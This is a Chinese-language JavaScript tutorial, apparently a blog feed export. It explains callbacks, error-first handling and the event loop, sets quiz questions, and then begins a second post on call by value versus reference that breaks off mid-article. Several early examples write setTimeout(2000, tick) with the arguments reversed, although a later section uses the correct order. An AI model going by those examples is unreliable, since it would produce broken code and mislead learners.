你以為陌生卻熟悉的 callbackcallback function 的意思其實就是：「當某事發生的時候，請利用這個 function 通知我」，雖然乍看之下會以為很陌生，但其實你早就在用了。
例如說：
const btn = document.querySelector(&#x27;.btn_alert&#x27;)btn.addEventListener(&#x27;click&#x27;, handleClick)  function handleClick() &#123;  alert(&#x27;click!&#x27;)&#125;

「當某事（有人點擊 .btn_alert 這個按鈕）發生時，請利用這個 function（handleClick）通知我」，handleClick不就是個 callback function 嗎？
又或者是：
window.onload = function() &#123;  alert(&#x27;load!&#x27;)&#125;

「當某事（網頁載入完成）發生時，請利用這個 function（匿名函式）通知我」，這不也是 callback function 嗎？
再舉最後一個範例：
setTimeout(2000, tick)function tick() &#123;  alert(&#x27;時間到！&#x27;)&#125;

「當某事（過了兩秒）發生時，請利用這個 function（tick）通知我」，這都是一樣的模式。
在使用 callback function 時，有一個初學者很常犯的錯誤一定要特別注意。都說了傳進去的參數是 callback function，是一個「function」，不是 function 執行後的結果（除非你的 function 執行完會回傳 function，這就另當別論）。
舉例來說，標準錯誤範例會長得像這樣：
setTimeout(2000, tick())function tick() &#123;  alert(&#x27;時間到！&#x27;)&#125;  // 或者是這樣window.onload = load()function load() &#123;  alert(&#x27;load!&#x27;)&#125;

tick是一個 function，tick()則是執行一個 function，並且把執行完的回傳結果當作 callback function，簡單來講就是這樣：
// 錯誤範例setTimeout(2000, tick())function tick() &#123;  alert(&#x27;時間到！&#x27;)&#125;  // 上面的錯誤範例等同於let fn = tick()setTimeout(2000, fn)function tick() &#123;  alert(&#x27;時間到！&#x27;)&#125;

由於 tick 執行後會回傳 undefined，所以 setTimeout 那行可以看成：setTimeout(2000, undefined)，一點作用都沒有。
把 function 誤寫成 function call 以後，會產生的結果就是，畫面還是跳出「時間到！」三個字，可是兩秒還沒過完。因為這樣寫就等於是你先執行了 tick 這個 function。
window.onload 的例子也是一樣，可以看成是這樣：
// 錯誤範例window.onload = load()function load() &#123;  alert(&#x27;load!&#x27;)&#125;  // 上面的錯誤範例等同於let fn = load()window.onload = fn

所以網頁還沒載入完成時就會執行 load 這個 function 了。
再次重申，tick 是 function，tick()是執行 function，這兩個的意思完全不一樣。
幫大家重點複習：

瀏覽器裡執行 JavaScript 的 main thread 同時也負責畫面的 render，因此非同步顯得更加重要而且必須，否則等待的時候畫面會凍結
callback function 的意思其實就是：「當某事發生的時候，請利用這個 function 通知我」
fn 是一個 function，fn() 是執行 function

Callback function 的參數前面有提到說 callback function 的參數需要看文件才能知道，我們舉底下這個點擊按鈕為例：
const btn = document.querySelector(&#x27;.btn_alert&#x27;)btn.addEventListener(&#x27;click&#x27;, handleClick)  function handleClick() &#123;  alert(&#x27;click!&#x27;)&#125;

從 MDN 的文件上，你可以看到它是這樣寫的：

一個叫做 event 的 object 會被傳進去，而這個 object 是在描述這個發生的事件。聽起來很抽象，但我們可以實際來實驗看看：
const btn = document.querySelector(&#x27;.btn_alert&#x27;)btn.addEventListener(&#x27;click&#x27;, handleClick)  function handleClick(e) &#123;  console.log(e)&#125;

當我們點擊這個按鈕之後，可以看到 console 印出了一個有超級多屬性的物件：

仔細看你會發現這個物件其實就是在描述我剛剛的「點擊」，例如說 clientX 與 clientY 其實代表著剛剛這個點擊的座標。最常用的，你一定也聽過的就是e.target，可以拿到這個點擊事件發生的 DOM 物件。
不過這時新手可能會有個疑問：「剛剛文件上明明寫說傳進來的參數叫做 event，為什麼你用 e 也可以？」
這是因為 function 在傳送以及接收參數的時候，注重的只有「順序」，而不是文件上的名稱。文件上的名稱只是參考用的而已，並不代表你就一定要用那個名稱來接收。function 沒有那麼智慧，不會根據變數名稱來判斷是哪個參數。
所以你的 callback function 參數名稱想要怎麼取都可以，handleClick(e)、handleClick(evt)、handleClick(event) 或是 handleClick(yoooooo)都可以，都可以拿到瀏覽器所傳的event這個物件，只是叫做不同名稱而已。
Callback function 會接收什麼參數，要看文件才會知道。如果沒有文件的話，沒有人知道 callback 會被傳什麼參數進來。
話雖然是這樣講，但其實在很多地方，參數都會遵循一個慣例。
Callback 的 error first 慣例同步與非同步的差別除了 callback 以外還有一個，那就是錯誤處理。
回到我們開頭舉的那個同步讀取檔案的範例：
const fs = require(&#x27;fs&#x27;) // 引入內建 file system 模組const file = fs.readFileSync(&#x27;./README.md&#x27;) // 讀取檔案console.log(file) // 印出內容

如果今天 ./README.md 這個檔案不存在，執行之後就會在 console 印出錯誤訊息：
fs.js:115    throw err;    ^  Error: ENOENT: no such file or directory, open &#x27;./README.md&#x27;    at Object.openSync (fs.js:436:3)    at Object.readFileSync (fs.js:341:35)

要處理這種錯誤，可以用 try...catch 的語法去包住：
const fs = require(&#x27;fs&#x27;) // 引入內建 file system 模組  try &#123;  const file = fs.readFileSync(&#x27;./README.md&#x27;) // 讀取檔案  console.log(file) // 印出內容&#125; catch(err) &#123;  console.log(&#x27;讀檔失敗&#x27;)&#125;

當我們用 try...catch 包住以後，就能夠針對錯誤進行處理，以上面的例子來說，就會輸出「讀檔失敗」這四個字。
可是如果換成非同步的版本，事情就有點不太一樣了，請先看底下的範例程式碼：
const fs = require(&#x27;fs&#x27;) // 引入內建 file system 模組  try &#123;  // 讀取檔案  fs.readFile(&#x27;./README.md&#x27;, (err, data) =&gt; &#123;    console.log(data) // 印出內容  &#125;)&#125; catch(err) &#123;  console.log(&#x27;讀檔失敗&#x27;)&#125;

執行以後，console 居然沒有任何反應！明明發生了錯誤，可是卻沒有被 catch 到，這是為什麼呢？
這就是同步與非同步另一個巨大的差異。
在同步的版本當中，我們會等待檔案讀取完畢才執行下一行，所以讀取檔案的時候出了什麼錯，就會把錯誤拋出來，我們就可以 try…catch 去處理。
但是在非同步的版本中，fs.readFile這個 function 只做了一件事，就是跟 Node.js 說：「去讀取檔案，讀取完之後呼叫 callback function」，做完這件事情之後就繼續執行下一行了。
所以讀取檔案那一頭發生了什麼事，我們是完全不知道的。
舉個例子，這就好像是餐廳的內外場，假設我負責外場，有人點了一碗牛肉麵，我就會朝廚房大喊：「一碗牛肉麵！」，就繼續服務下一個客戶了。喊完之後內場有沒有真的開始做牛肉麵？我不知道，但應該要有。內場如果牛肉賣完了做不出來，我喊的當下也是不會知道的。
那我要怎麼知道？
假設牛肉真的賣完了，內場會主動來跟我說嘛，這時候我才會知道牛肉賣完了。
這就好像非同步的範例一樣，那一行只負責告訴系統「去讀檔」，剩下的不甘它的事，如果發生什麼事，必須主動告訴它，要用 callback 的方式來傳遞。
我們再複習一次開頭提過的 Node.js 的 readFile 的文件：

callback 會有兩個參數，第一個是 err，第二個是 data，這樣你就知道 err 是怎麼來的了。只要在讀檔的時候碰到任何錯誤，例如說檔案不存在、檔案超過記憶體大小或是檔案沒有權限開啟等等，都會透過這個 err 參數傳進來，這個錯誤你用 try…catch 是抓不到的。
所以，當我們非同步地執行某件事情的時候，有兩點我們一定會想知道：

有沒有發生錯誤，有的話錯誤是什麼
這件事情的回傳值

舉例來說，讀取檔案我們會想知道有沒有錯誤，也想知道檔案內容。或是操作資料庫，我們會想知道指令有沒有下錯，也想知道回傳的資料是什麼。
既然非同步一定會想知道這兩件事，那就代表至少會有兩個參數，一個是錯誤，另一個是回傳值。小標題所說的「error first」，就代表錯誤「依照慣例」通常會放在第一個參數，其他回傳值放第二個以及第二個之後。
為什麼呢？
因為錯誤只會有一個，但回傳值可能有很多個。
舉例來說，假設有一個getFileStats的 function 會非同步地去抓取檔案狀態，並且回傳檔案名稱、檔案大小、檔案權限以及檔案擁有者。如果把 err 放最後一個參數，我們的 callback 就會長這個樣子：function cb(fileName, fileSize, fileMod, fileOwner, err)
我一定要把所有參數都明確地寫出來，我才能拿到 err。換句話說，假設我今天只想要檔案名稱跟檔案大小，其他的我不在意，該怎麼辦？不怎麼辦，一樣得寫這麼長，因為 err 在最後一個。
如果把 err 擺前面的話，我就只要寫：function cb(err, fileName, fileSize) 就好，後面的參數我不想拿的話不要寫就好。
這就是為什麼要把 err 擺在最前面，因為我們一定會需要 err，但不一定需要後面所有的參數。因此你只要看到有 callback function，通常第一個參數都代表著錯誤訊息。
所以很常會看到這種處理方式，先判斷有沒有錯誤再做其他事情：
const fs = require(&#x27;fs&#x27;)fs.readFile(&#x27;./README.md&#x27;, (err, data) =&gt; &#123;  // 如果錯誤發生，處理錯誤然後返回，就不會繼續執行下去  if (err) &#123;    console.log(err)    return  &#125;  console.log(data)&#125;);

最後補充三點，第一點是 error first 只是個「慣例」，實際上會傳什麼參數還是要根據文件而定，你也可以寫一個把錯誤放在最後一個參數的 API 出來（但你不應該這樣做就是了）。
第二點是儘管是非同步，還是有可能利用 try catch 抓到錯誤，但是錯誤的「類型」不一樣，例如說：
const fs = require(&#x27;fs&#x27;)  try &#123;  // 讀取檔案  fs.readFile(&#x27;./README.md&#x27;)&#125; catch(err) &#123;  console.log(&#x27;讀檔失敗&#x27;)  console.log(err)  // TypeError [ERR_INVALID_CALLBACK]: Callback must be a function&#125;

這邊抓到的錯誤並不是「讀取檔案」所產生的錯誤，而是「呼叫讀取檔案這個 fucntion」所產生的錯誤。以前面餐廳的例子來說，就是客人點餐的時候你就知道東西賣完了，所以你根本不必去問內場，就可以直接跟客人說：「不好意思我們牛肉麵賣完囉，你要不要考慮點別的」。
最後一點想補充的是，有些人可能會問說：「那為什麼 setTimeout 或是 event listener 這些東西都沒有 err 這個參數？」
那是因為這幾個東西的應用場合不太一樣。
setTimeout 的意思是：「過了 n 秒後，請呼叫這個 function」，而 event listener 的意思是：「當有人點擊按鈕，請呼叫這個 function」。
「過了 n 秒」以及「點擊按鈕」這兩件事情是不會發生錯誤的。
但像是 readFile 去讀取檔案，就有可能在讀取檔案時發生錯誤；而 XMLHttpRequest 則是有另外的 onerror 可以用來捕捉非同步所產生的錯誤。
一樣來整理重點：

callback function 的參數跟一般 function 一樣，是看「順序」而不是看名稱，沒有那麼智慧
依照慣例，通常 callback function 的第一個參數都是 err，用來告訴你有沒有發生錯誤（承第一點，你想取叫 e、error 或是 fxxkingError 都可以）
非同步還是有可能用 try catch 抓到錯誤，但那是代表你在「呼叫非同步函式」的時候就產生錯誤

理解非同步的最後一塊拼圖：Event loop前面講了這麼多非同步的東西，你有沒有想過非同步到底是怎麼做的？
不是常常聽別人說 JavaScript 是 single thread，只有一個執行緒在跑嗎？可是如果真的是 single thread，怎麼可能達成非同步？
想要理解非同步操作到底怎麼達成的，我唯一推薦這個影片：What the heck is the event loop anyway? | Philip Roberts | JSConf EU，每個看過的人都讚不絕口。
只要你看了這個影片，就會知道非同步背後是怎麼一回事了。因為這影片實在是講得太好了，因此我底下只會幫大家重點複習一下，請看完影片再往下閱讀，如果你還沒看的話…看一下啦，拜託。
在程式的執行裡面，會有一個東西叫做 call stack，基本上就是紀錄著每個 function 執行時需要用到的資源，以及記錄著 function 執行的順序。
舉例來說，考慮以下程式碼：
function a() &#123;  return 1&#125;function b() &#123;  a()&#125;function c() &#123;  b()&#125;c()

我們先呼叫了 c，所以 call stack 長這樣（底下的範例會往上長）：
c

c 裡面呼叫了 b：
bc

b 裡面再呼叫了 a：
abc

當 a 執行完之後要回到哪一個 function 呢？很簡單，把 a 從 call stack 移除，在最上面的那個就是了：
bc

接著 b 執行完，從 call stack 裡面拿出來：
c

c 執行完，call stack 清空，程式執行結束。
記錄著 function 執行順序以及其他需要的東西的地方就是 call stack，而知名的錯誤 stack overflow 指的就是 stack 太多東西滿出來了，例如說你遞迴呼叫一個 function 十萬次，stack 沒辦法存這麼多東西，於是就丟出 stack overflow 的錯誤。
JavaScript 的「只有一個 thread」指的就是只有一個 call stack，所以同一個時間只能執行一件事情。
那非同步到底是怎麼做到的呢？
我只說「JavaScript 同一個時間只能執行一件事」，但是並沒有說「執行環境也是如此」。
例如說讀檔好了，我們上面把非同步讀檔的程式碼解釋為：「叫系統去讀檔，讀完檔之後透過 callback function 把結果傳回來」，在這背後 Node.js 可以用另一個 thread 去讀取檔案，這是完全沒有問題的。
setTimeout 也是如此，setTimeout(fn, 2000) 只是在告訴瀏覽器說：「2 秒以後幫我呼叫 fn 這個 function」，瀏覽器就可以開另外一個 thread 去計時，而不是利用 main thread。
重點是，當這些其他 thread 的事情做完以後，要怎麼樣重新丟回 main thread？因為只有 main thread 可以執行 JavaScript 嘛，所以一定要丟回去，不然沒辦法跑。
這就是 event loop 在做的事情了。
先來看一張經典的圖：
（圖片來源：Understanding Event Loop, Call Stack, Event &amp; Job Queue in Javascript 裡面附的 codepen 截圖）
我們先來解釋右半部，假設我們執行了 setTimeout(fn, 2000) 這一行程式碼，會先把 setTimeout(fn, 2000) 丟到 call stack 去執行，然後 setTimeout 屬於 Web API，所以會跟瀏覽器說：「欸欸，幫我設定一個計時器，2000 毫秒以後呼叫 fn」，然後就執行結束，從 call stack 裡面 pop 掉。
當瀏覽器的計時器時間一到，就會把 fn 這個 function 丟進去 callback queue，為什麼這邊要有一個 queue 呢？因為可能會有很多 callback function 都在等待執行嘛，所以需要有一個排隊機制讓大家在這邊排隊，一個一個慢慢來，所以才叫做 callback queue，而不是 callback array 或是 callback stack。
接著就是重點 event loop 了，它扮演的角色很簡單，用白話文講就是：

不斷偵測 call stack 是否為空，如果是空的話就把 callback queue 裡面的東西丟到 call stack

以程式的角度去想，event loop 之所以叫做 loop，就是因為它可以表示成這樣：
while(true) &#123;  if (callStack.length === 0 &amp;&amp; callbackQueue.length &gt; 0) &#123;    // 拿出 callbackQueue 的第一個元素，並放到 callStack 去    callStack.push(callbackQueue.dequeue())  &#125;&#125;

就是這樣子而已，就是那麼簡單。
這就好像很多知名的博物館都有人數管制，你得先去買票，買票完以後去排隊。接著門口的警衛看到前面的人都已經到下一個景點了，才會把隊伍裡面的人放進來。
while(true) &#123;  if (博物館入口沒有人 &amp;&amp; 排隊的隊伍有人) &#123;    放人進去博物館()  &#125;&#125;

這邊只要掌握一個重點就好：「非同步的 callback function 會先被放到 callback queue，並且等到 call stack 為空時候才被 event loop 丟進去 call stack」
Event loop 就是那種只會出一張嘴不會做事的人，它不負責幫你執行 callback function，只會幫你把 function 丟到 call stack，真正在執行的還是 JavaScript 的 main thread。
理解 event loop 這個機制之後，就可以來解釋非同步的行為了，這邊影片裡面已經解釋得很清楚了，我就不再多講了，我只舉一個常見的範例：
setTimeout(() =&gt; &#123;  console.log(&#x27;0ms&#x27;)&#125;, 0)console.log(&#x27;hello&#x27;)

請問是 hello 會先被印出來，還是 0ms 會先被印出來，還是不一定？
如果你的答案不是「hello 會先被印出來」，就代表其實沒有理解 event loop 這個機制，麻煩回去把影片重看一遍。
上面的範例中那個 callback function 會在 0ms 之後被放到 callback queue 去，但請注意，這時候 call stack 還不是空的，所以 console.log(&#39;hello&#39;) 會先被執行，執行完之後 call stack 清空，event loop 才把 callback 放到 call stack，然後才執行 callback 裡面的 console.log(&#39;0ms&#39;)。
所以輸出的順序保證會是 hello 先，再來才是 0ms。
最後做幾個小補充，第一個是 setTimeout 傳 0 只是代表「儘快執行」，不一定在 0ms 以後就會觸發，可能會是 4ms 或是更長，詳情可參考：MDN: Reasons for delays longer than specified
第二個補充是 event loop 其實還有一個小細節，那就是 callback queue 還區分成 macro task 跟 micro task 兩種，但這個有點小複雜，以後有機會再說。
第三個補充是雖然 Node.js 跟瀏覽器都有 event loop，但就像這兩個執行環境都有 setTimeout 一樣，背後的原理跟實作是不同的。大致上相同，但是細節不同。
第四個補充是上面提到的「只有 main thread 可以執行 JavaScript」其實不正確，因為在瀏覽器裡面有 Web Worker 可以用。
非同步小測驗在理解了非同步的原理 event loop 之後，照理來說你應該要對非同步的執行相當熟悉了，底下我會給出幾個題目，讓你驗證一下自己是否有真的理解：
1. 活動網站小明在一間專門辦活動的網站擔任前端工程師，被主管指派一個任務，那就是要加一段程式碼，呼叫後端 API 來取得「活動是否已經開始」，開始的話才前往活動頁，否則就不做任何事。
假設getAPIResponse是一個非同步的 function，會利用 ajax 去呼叫 API 之後取得結果，而/event這個 API 會回傳 JSON 格式的資料，其中started這個 boolean 的欄位代表著活動是否已經開始。
於是小明寫出以下程式碼：
// 先設一個 flag 並且設為 false，表示活動沒開始let isEventStarted = false  // call API 並取得結果getAPIResponse(&#x27;/event&#x27;, response =&gt; &#123;  // 判斷活動是否開始並設置 flag  if (response.started) &#123;    isEventStarted = true  &#125;&#125;)  // 根據 flag 決定是否前往活動頁面if (isEventStarted) &#123;  goToEvent()&#125;

請問：這段程式碼有沒有問題？如果有的話，問題在哪裡？
2. 慢慢等在完成了活動網頁之後，小明覺得自己對非同步好像還是沒有那麼熟悉，於是就想來做個練習，寫出了底下的程式碼：
let gotResponse = falsegetAPIResponse(&#x27;/check&#x27;, () =&gt; &#123;  gotResponse = true  console.log(&#x27;Received response!&#x27;)&#125;)  while(!gotResponse) &#123;  console.log(&#x27;Waiting...&#x27;)&#125;

意思就是在 ajax 的 response 回來之前會不斷印出 waiting，直到接收到 response 才停止。
請問：以上寫法可以滿足小明的需求嗎？如果不行，請詳述原因。
3. 詭異的計時器小明被主管指派要去解一個 bug，在公司的程式碼裡面找到了這一段：
setTimeout(() =&gt; &#123;  alert(&#x27;Welcome!&#x27;)&#125;, 1000)// 後面還有其他程式碼，這邊先略過

這個 bug 是什麼呢？就是這個計時器明明指定說 1 秒之後要跳出訊息，可是執行這整段程式碼（注意，底下還有其他程式碼，只是上面先略過而已）以後，alert 卻在 2 秒以後才跳出來。
請問：這有可能發生嗎？無論你覺得可能或不可能，都請試著解釋原因。
4. 執行順序大考驗a(function() &#123;  console.log(&#x27;a&#x27;)&#125;)console.log(&#x27;hello&#x27;)

請問：最後的輸出順序為何？是先 hello 再 a，還是先 a 再 hello，還是不一定？

底下會針對每一題來做解答，強烈建議上面四題自己思考完以後再往下滑。
解答：1. 活動網站答案是有問題，這整段程式碼把同步與非同步混著寫，是最常見的錯誤。
要等 call stack 清空以後，event loop 才會把 callback 丟到 call stack，所以最後判斷 isEventStarted 的這一段程式碼會先被執行。當執行到這一段的時候，儘管 response 已經回來了，但 callback function 還在 callback queue 裡面待著，所以判斷isEventStarted的時候一定會是 false。
正確的方法是把判斷活動是否開啟的邏輯放在 callback 裡面，就可以確保拿到 response 以後才做判斷：
// call API 並取得結果getAPIResponse(&#x27;/event&#x27;, response =&gt; &#123;  // 判斷活動是否開始並設置 flag  if (response.started) &#123;    goToEvent()  &#125;&#125;)

解答：2. 慢慢等答案是不行。
還記得 event loop 的條件嗎？「當 call stack 為空，才把 callback 丟到 call stack」。
while(!gotResponse) &#123;  console.log(&#x27;Waiting...&#x27;)&#125;

這一段程式碼會不斷執行，成為一個無窮迴圈。所以 call stack 永遠都有東西，一直被佔用，callback queue 裡面的東西根本丟不進 call stack。
因此小明原本的程式碼無論有沒有拿到 response，都只會一直印出 waiting。
解答：3. 詭異的計時器答案是有可能。
WebAPI 會在一秒之後把 callback 丟到 callback queue，那為什麼兩秒之後才會執行呢？因為這一秒 call stack 被佔用了。
只要 setTimeout 底下的程式碼做了很多事情並佔用了一秒鐘，callback 就會在一秒之後才被丟到 call stack 去，例如說：
setTimeout(() =&gt; &#123;  alert(&#x27;Welcome!&#x27;)&#125;, 1000)  // 底下這段程式碼會在 call stack 佔用一秒鐘const end = +new Date() + 1000while(end &gt; new Date())&#123;  &#125;

所以 setTimeout 只能保證「至少」會在 1 秒後執行，但不能保證 1 秒的時候一定執行。
解答：4. 執行順序大考驗答案是不一定。
因為我沒有說a是同步還是非同步的，你不要看到 callback 就以為是非同步。
我的 a 可以這樣實作：
function a(fn) &#123;  fn() // 同步執行 fn&#125;  a(function() &#123;  console.log(&#x27;a&#x27;)&#125;)console.log(&#x27;hello&#x27;)

輸出就會是 a 然後 hello。
也可以這樣實作：
function a(fn) &#123;  setTimeout(fn, 0) // 非同步執行 fn&#125;  a(function() &#123;  console.log(&#x27;a&#x27;)&#125;)console.log(&#x27;hello&#x27;)

輸出就是 hello 然後才 a。
結語想要理解非同步的話必須一步一步來，不要想著一步登天。
這也是為什麼標題會叫做「先成為 callback 大師」，因為你得先對 callback 有一定的熟練程度之後才能進入下一個階段，這樣會容易很多。
這一篇主要是想幫大家建立起幾個重要的觀念：

什麼是阻塞？什麼是非阻塞？
什麼是同步？什麼是非同步？
同步與非同步的差別在哪裡？
為什麼需要非同步？
callback 是什麼？
為什麼需要 callback？
callback 的 error first 慣例
什麼是 event loop？它做了什麼？
非同步常見的坑有哪些？

若是能夠完全理解這篇，並且把文末的小測驗徹底搞懂，我相信你對非同步的理解應該就沒什麼問題了，實作上也能順利許多。在理解非同步基礎以及 callback 之後，下一篇將會講到使用 callback function 會碰到的問題以及解決方案：Promise，也會稍微提一下比較新的語法 async&#x2F;await。
（目前還沒有下集，有了之後我會補上）
參考資料：

Overview of Blocking vs Non-Blocking
What are callbacks?
What are the error conventions?
你懂 JavaScript 嗎？#23 Callback
What the heck is the event loop anyway? | Philip Roberts | JSConf EU

關於作者：@huli 野生工程師，相信分享與交流能讓世界變得更美好
]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>深入探討 JavaScript 中的參數傳遞：call by value 還是 reference？</title>
    <url>/2018/06/23/javascript-call-by-value-or-reference/</url>
    <content><![CDATA[前言其實這週原本是要來寫淺拷貝跟深拷貝的差異以及實作，但在找資料的時候無意間又看到 call by value 與 call by reference 相關的文章，越研究發現越有趣。原本以為自己已經搞懂了這個問題，但沒想到看的資料越多，卻把自己弄的越糊塗。
要寫這篇文章其實有兩個不同的方式，一個是詳實記錄我研究這個問題的過程以及心中的疑惑，以及最後如何得到解答，簡單來說就是按照時間軸來寫；另外一個是當我研究完以後，再重新以自己的方式整理，並且用更簡單易懂的方式來表達。
以往我的文章大多數都走第二種路線，重新歸納整理過後再寫出一篇相對上更容易理解的文章，用我的方式帶著大家一步步跟著我的脈絡去探討問題最後得出解答。
但這次我想嘗試第一種，帶大家看看我平常寫文章的時候都看了哪些資料，以及發想的過程為何，這樣應該也滿有趣的。
Let’s go!
美麗的錯誤開頭有講過了，我會再重新回來研究參數傳遞這個問題完全是個美麗的錯誤，我本來要寫的主題是深拷貝跟淺拷貝。
在找資料的時候，我查到了這篇文：[Javascript] 關於 JS 中的淺拷貝和深拷貝
，我看了看之後發現如果我要來講深拷貝，我就必須先講解為什麼我們需要深拷貝，就要講到 Object 跟其他 Primitive types 的不同之處。
想到這邊，我就想到了一個老問題：JavaScript 的 Object 到底是 pass by value 還是 pass by referece？
我依稀記得答案是前者，或者兩者都不是，而是有個新的名詞叫作 pass by sharing。
為了驗證自己的印象沒錯，我繼續動手搜尋，最後找到了[筆記] 談談JavaScript中by reference和by value的重要觀念以及重新認識 JavaScript: Day 05 JavaScript 是「傳值」或「傳址」？，後者我有印象我看過，而且驗證了我的印象是正確的。
好，話說到這裡，必須先跟大家介紹一下這三者以及之間的差異，否則沒辦法繼續往下講。
Function 的參數傳遞方式先來一個很簡單的範例：
function swap(a, b) &#123;  var temp = a;  a = b;  b = temp;&#125;  var x = 10;var y = 20;swap(x, y);console.log(x, y) // 10, 20

當你執行完swap之後，x跟y的值並沒有交換，為什麼？因為你傳進去的東西「不是真的 x 跟 y」，而是「x 跟 y 的值的拷貝」。
也就是說a跟b其實就是另外兩個新的變數，然後存的值跟x和y一樣，但你改變了a不會改變x，因為他們是兩個不同的變數。
可以參考下面的精美小動畫：

上面這種方式就叫做：call by value（或是 pass by value），在呼叫 function 的時候把「值」給複製一份。
到這邊應該還滿好懂的，接下來要開始慢慢進入到複雜的部分了。有另外一種方法，叫做 call by reference，意思是「你傳進去的東西就是真的 x 跟 y，function 裡面的 a 跟 b 只是別名（alias）而已，改變 a 就會改變 x」
很顯然的，在 JavaScript 裡面對於像數字這種的 Primitive type，是沒有 call by reference 的，因為你絕對不可能透過 function 內的引數去改變 function 外面的變數。
對於數字不可能，那對 object 呢？
function add(obj) &#123;  obj.number++&#125;  var o = &#123;number: 10&#125;add(o)console.log(o.number) // 11

哪泥！居然在 function 裡面成功改變外面的東西了！難道這就是 call by reference 嗎？
先別急，乍看之下很像，可是有一個操作會露出破綻：
function add(obj) &#123;  // 讓 obj 變成一個新的 object  obj = &#123;    number: obj.number + 1  &#125;&#125;  var o = &#123;number: 10&#125;add(o)console.log(o.number) // 10

如果是真的 call by reference，那你在 function 裡面把 obj 的值改掉了，外面的 o 也會一起被改掉，變成那個新的 object，可是從上面這段範例看起來並沒有，所以這樣做不是 call by reference。
既不是 call by value 也不是 call by reference，那這樣應該叫做什麼呢？
有人把這種方式叫做 call by sharing，意思就是我們讓 function 裡面的那個obj跟外面的o「共享」同一個 object，所以透過裡面的 obj，你可以去修改「共享到的那個 object」的資料。
上面都跟 call by reference 看起來沒兩樣，但最大的差異是如果你在 function 裡面把 obj 重新賦值，就代表你要讓這個 obj 指向一個新的 object，所以外面的 o 依舊還是原來的值。

引入了一個新名詞之後，看起來所有問題都得到了解答，結論就是：「在 JavaScript，primitive types 是 call by value，object 是 call by sharing」
不過，這一切只是我天真的想法而已，某天我看到一句話…
JavaScript 只有 call by value這句話乍看之下完全沒道理，剛剛不是說是 call by sharing 嗎？怎麼又變成 call by value 了？
但其實這句話是要這樣解讀的：
當你在宣告一個 object 的時候，在底層實作上，其實這個 object 存的是一個記憶體位置，或如果用 C 的方式來講，object 的底層就是一個指標。
先幫大家複習一下指標，你可以把指標看成是變數型態的一種，差別在於它所儲存的值是「記憶體位置」。


o 這個變數的值是什麼？

這個問題的答案是我認為理解「JavaScript 只有 call by value」這句話的關鍵。
如果從上層來看，答案理所當然會是：「o 的值是 {number: 10}」。可是如果你從底層實作的角度來看，答案就會是：「o 的值是 0x01」
我們用第二個答案繼續往下講，假設 o 的值是 0x01 的話，那你在呼叫 function 的時候，傳進去的值其實就是 0x01，所以在 function 裡面的變數才可以透過這個記憶體位置去操作同樣的東西。
就是我們前面那張圖畫的，o 跟 obj 兩個變數會「指向」同一個地方。而底層實作原理就是把 o 的記憶體位置傳給 obj 嘛，不然怎麼能指向同個地方。
如果以這個角度來看，call by sharing（傳記憶體位置進去）其實就是 call by value 的一種，解釋的方式為：其實一樣是傳值的拷貝進去，只是這個值是記憶體位置。
乍聽之下有點道理，可是有個點我怎麼想都想不通：

如果你要從底層實作的原理來看，那 call by reference 不也是 call by value 的一種嗎？

因為以底層來看，call by reference 一樣也是傳記憶體位置進去啊，那不就全世界都只有 call by value？
後來我查到了一篇文章跟我有類似的想法：Re: [問題] 請問傳參考到底是什麼?
不過看完之後還是沒有得到解答，只有個模糊的概念，覺得這可能是一個名詞定義的問題。
抱著追根究柢的精神，我決定來看看 ECMAScript 怎麼說。
探索聖經的路程ECMAScript 的 spec 就是 JavaScript 的聖經，在裡面你可以找到更底層的實作，而且內容絕對不會出錯。
目前能找到的相關文章，大部分的參考資料來源都是這裡：ECMA-262-3 in detail. Chapter 8. Evaluation strategy.
我原本以為這篇是 ECMA-262-3 的節錄，看完之後發現根本不是，其實只是某個人看完 ECMA-262-3 之後的筆記而已。
不過這篇其實寫得很不錯，我們可以直接看結論的部分：

It can be either “call by value”, with specifying that the special case of call by value is meant — when the value is the address copy. From this position it is possible to say that everything in ECMAScript are passed by value.


Or, “call by sharing”, which makes this distinction from “by reference”, and “by value”. In this case it is possible to separate passing types: primitive values are passed by value and objects — by sharing.


The statement “objects are passed by reference” formally is not related to ECMAScript and is incorrect.

但可惜的是沒有說 ECMA-262 裡面到底哪個部分有提到這些，而且我怎麼查都查不到有任何人的文章有附上 ECMA-262 的參考來源。
沒辦法，只好自己找了。
我從ecma international上面下載了ECMA-262 edition 8，並且利用幾個關鍵字來找：

call by reference
call by value
pass by reference
pass by value

結果呢？結果一無所獲，完全搜尋不到這些字。接著只好把關鍵字縮小一點，利用：reference、sharing等等的關鍵字去找，找到6.2.4 The Reference Specification Type，雖然看似相關，但沒有找到最關鍵的部分。
八百多頁的文章，這樣慢慢找實在是很累，而這樣子找下來，依舊沒有任何收穫。接著我轉個念頭：「那我來搜尋 arguments 好了」，找到兩個看似相關的章節（9.4.4 ArgumentsExoticObjects 與 9.2 ECMAScript Function Objects），但依舊沒有詳細說明。
用上面的關鍵字都找不到，我決定再換個念頭：「那我來查等號的定義好了，要比較 object 的話，應該會寫說如何比較兩個 object 是否相同，應該就會提到 reference 之類的相關詞彙了！」
最後查到了這段：



If x and y are the same Object value, return true. Otherwise, return false.


好，有說跟沒說一樣。查了一兩個小時發現幾乎沒進展以後，我決定放棄這個接近九百頁的版本。
後來我去下載了ECMA-262 的第一版，篇幅少很多，只有 200 頁不到，在搜尋了幾個關鍵字發現還是沒什麼結果之後，我決定把整本快速掃過一遍。
先講結論，我還是沒有找到任何跟 call by value&#x2F;reference 有關的地方，可是看到一些滿有趣的東西。
例如說判斷是否相等的地方寫的不太一樣：


11.9.3 The Abstract Equality Comparison Algorithm
13.Return true if x and y refer to the same object or if they refer to objects joined to each other (see 13.1.2). Otherwise, return false.

提到了一個叫做 joined objects 的東西：

不過跟我們想找的地方還是不太一樣。
於是，我放棄了從 ECMAScript 去找答案的這個想法。
在覺得無助的同時，想起了一個也有著相似問題（到底是 call by value 還是 call by reference）的程式語言：Java。
Java is always pass-by-value以前在寫 Java 的時候也有碰過這個問題，而且跟 JavaScript 的其實一模一樣，就是你傳一般的值進去是 by value，可是你傳 object 進去的時候又表現的像 call by reference，但是賦值的時候又不會改變外面的 object。
但看起來 Java 永遠都是 pass by value 已經是個共識了，可參考 Is Java “pass-by-reference” or “pass-by-value”?、Parameter passing in Java - by reference or by value? 跟 Java is Pass-by-Value, Dammit!。
理由其實跟我們最開始說的一樣，讓我節錄 Java is Pass-by-Value, Dammit! 的其中一句：

However, Objects are not passed by reference. A correct statement would be Object references are passed by value.

以及 Parameter passing in Java - by reference or by value? 的其中一段：

